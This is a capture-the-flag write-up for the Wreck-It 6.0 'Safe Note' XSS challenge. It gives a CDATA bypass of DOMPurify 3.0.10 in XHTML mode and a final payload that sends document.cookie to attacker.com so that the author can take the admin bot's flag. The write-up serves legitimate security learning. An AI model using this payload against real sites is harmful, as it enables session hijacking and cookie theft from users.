+++
author = "bkmlauda"
title = "Wreck-It 6.0 - Safe Note"
date = "2025-10-05"
categories = ["ctf"]
+++

### Overview

This time we are given some sort of app to write notes, that have some function to render to html directly. We are also given a bot to report a link to admin.

### Solve

Right off the bat, I think its XSS. Tried several paylaods, so much blacklist on html tags, `<img>` isn't. Theres also sanitazion on added attributes like `onerror`,

sample payload:
```html
<p>welcome to ctf notes!</p><img src='x' onerror="fetch('example.com')">

```

result:
```html
<div id="renderTarget" class="preview" aria-live="polite">
    <p xmlns="http://www.w3.org/1999/xhtml">welcome to ctf notes!</p>
    <img xmlns="http://www.w3.org/1999/xhtml" src="x"></div>
```

Figured out the app indeed have some sanitazion with `DOMPurify`:
```javascript
...
  function renderNow() {
    const raw = $note.value || '';
    const clean = DOMPurify.sanitize(raw, {
      PARSER_MEDIA_TYPE: "application/xhtml+xml", 
      USE_PROFILES: { html: true }
    });
    $target.innerHTML = clean;
  }
...
```

The app utilize `DOMPurify v3.0.10` which actually has an old vuln with `CDATA` bypass

The Working Payload for DOMPurify 3.0.10 with XHTML mode:
```bash
<![CDATA[ ><img src onerror=alert(document.domain)> ]]>
```
Why This Works:

When DOMPurify sanitizes this as XML with PARSER_MEDIA_TYPE "application/xhtml+xml", it treats CDATA as a valid XML construct. However, when the browser renders it as HTML, it doesn't recognize CDATA in the HTML namespace and instead treats it as a bogus comment, ending at the first `>` character instead of `]]>`

final payload:
```bash
<![CDATA[ ><img src onerror="fetch('https://attacker.com/?c='+btoa(document.cookie))"> ]]>
```

Finally, make the shared link, report to admin, fetch the cookies on the request bin which contain the flag.